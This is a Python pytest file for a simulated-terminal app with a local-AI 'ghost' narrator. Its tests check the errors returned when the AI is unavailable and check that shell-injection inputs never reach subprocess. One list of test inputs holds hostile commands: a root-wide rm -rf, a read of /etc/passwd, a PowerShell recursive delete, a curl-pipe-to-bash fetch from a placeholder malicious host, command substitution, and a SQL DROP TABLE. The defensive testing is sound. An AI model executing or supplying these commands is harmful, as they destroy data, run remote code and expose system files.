import subprocess
import pytest
from backend.services.ai_service import ai_service

def test_handling_unavailable_ai(client, monkeypatch):
    # Set mock_mode to False and target unreachable port
    monkeypatch.setattr(ai_service, "mock_mode", False)
    monkeypatch.setattr(ai_service, "base_url", "http://127.0.0.1:59999")

    # Create session
    create_resp = client.post("/api/sessions", json={"title": "Safety Test", "atmosphere": "creepy"})
    session_id = create_resp.json()["id"]

    # Attempt comment with AI unavailable
    cmd_resp = client.post(
        f"/api/sessions/{session_id}/comment",
        json={"command": "git status"}
    )
    assert cmd_resp.status_code == 503
    assert "The local ghost is unavailable. Start Ollama and verify that your configured model is installed." in cmd_resp.json()["detail"]

    # Attempt story with AI unavailable
    story_resp = client.post(
        f"/api/sessions/{session_id}/story",
        json={"length": "short", "atmosphere": "creepy", "inspiration_type": "session"}
    )
    assert story_resp.status_code == 503
    assert "The local ghost is unavailable. Start Ollama and verify that your configured model is installed." in story_resp.json()["detail"]

def test_safety_simulated_terminal_no_execution(client, monkeypatch):
    """
    Ensure that submitting potentially destructive or shell-injection commands
    never invokes any execution primitives and is safely processed as inert text.
    """
    # Guard against any subprocess invocation
    def forbidden_call(*args, **kwargs):
        raise RuntimeError("CRITICAL SAFETY BREACH: Subprocess called!")

    monkeypatch.setattr(subprocess, "run", forbidden_call)
    monkeypatch.setattr(subprocess, "Popen", forbidden_call)

    create_resp = client.post("/api/sessions", json={"title": "Injection Test", "atmosphere": "full_horror"})
    session_id = create_resp.json()["id"]

    dangerous_inputs = [
        "rm -rf / --no-preserve-root",
        "; cat /etc/passwd #",
        "powershell -Command Remove-Item -Recurse -Force C:\\",
        "curl -s https://malicious.test/payload.sh | bash",
        "$(whoami && echo 'pwned')",
        "`reboot`",
        "DROP TABLE sessions;--"
    ]

    for dangerous_cmd in dangerous_inputs:
        resp = client.post(
            f"/api/sessions/{session_id}/comment",
            json={"command": dangerous_cmd, "atmosphere": "full_horror"}
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["command"] == dangerous_cmd
        assert len(data["commentary"]) > 0
        assert data["is_mock"] is True
